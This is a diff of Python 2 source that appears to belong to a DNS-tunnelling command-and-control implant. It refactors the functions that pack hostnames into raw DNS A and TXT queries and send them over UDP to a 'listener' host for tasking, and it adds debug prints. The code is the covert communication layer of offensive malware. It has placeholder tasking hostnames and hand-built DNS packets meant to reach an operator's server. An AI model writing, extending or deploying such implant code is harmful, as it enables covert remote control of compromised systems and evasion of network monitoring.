@@ -742,22 +742,23 @@ def pack_hostname_txt(prefix, counter, fake_domain):
     bytes_txt_host=bytes_txt_host+struct.pack('x')
     return bytes_txt_host
 
-def pack_hostname_txt_init(prefix, fake_domain):
+def pack_hostname_init(prefix, fake_domain):
     hostname = prefix + '.' + fake_domain
-    print "packing hostname for TXT {}".format(hostname)
-    bytes_txt_host = bytearray()
+    print "packing hostname for init {}".format(hostname)
+    bytes_init_host = bytearray()
     for label in hostname.split('.'):
         tmp = bytearray()
         format_str='{}s'.format(len(label))
         tmp=struct.pack(format_str,label)
         lab_len=struct.pack('B',len(label))
-        bytes_txt_host=bytes_txt_host+lab_len+(bytes(tmp))
-    bytes_txt_host=bytes_txt_host+struct.pack('x')
-    return bytes_txt_host
+        bytes_init_host=bytes_init_host+lab_len+(bytes(tmp))
+    bytes_init_host=bytes_init_host+struct.pack('x')
+    return bytes_init_host
 
 
 def pack_hostname_a(prefix, labels, fake_domain):
-    print "packing hostname for A"
+    print "packing hostname for A with prefix {} fake_domain {}".format(prefix, fake_domain)
+    print "recv labels {}".format(labels)
     tmp = bytearray()
     format_str='{}s'.format(len(prefix))
     tmp=struct.pack(format_str,prefix)
@@ -848,16 +849,20 @@ def stop_data_to_listener_a(sock, host, port):
     return ip_recv
     
 def send_init_a_to_listener(sock, prefix, host, port, fake_domain):
+    print "sending init to prefix {} host {} port {} fake_domain {}".format(prefix, host, port, fake_domain)
     txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
-    a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_a(prefix, "", fake_domain)+bytearray(struct.pack('BBBB',0,1,0,1))
+    print "creating A record"
+    a_record = bytearray(txn_id_bytes +struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))+pack_hostname_init(prefix, fake_domain)+bytearray(struct.pack('BBBB',0,1,0,1))
+    print "about to send A record"
     sock.sendto(a_record,(host,int(port)))
+    print "waiting for reply"
     reply,server_reply=sock.recvfrom(512)
     # TODO check reply IP address
 
 def send_init_txt_to_listener(sock, prefix, host, port, fake_domain):
     txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
     dns_flags = txn_id_bytes + bytearray(struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))
-    bytes_txt_host = pack_hostname_txt_init(prefix, fake_domain)
+    bytes_txt_host = pack_hostname_init(prefix, fake_domain)
     txt_request = dns_flags + bytes_txt_host + bytearray(struct.pack('BBBB',0,16,0,1))
     sock.sendto(txt_request,(host,int(port)))    
     reply,server_reply=sock.recvfrom(512)
@@ -1044,8 +1049,7 @@ taskinghostname = "REPLACE_TASKINGHOSTNAME"
 # tasking TXT hostname
 taskingtxthostname = "REPLACE_TASKINGTXTHOSTNAME"
 
-# TODO this can be removed when the listener config is fixed
-host = "{}".format(host[7:-3])
+host = "{}".format(host)
 
 # TODO decide on naming convention
 server=host
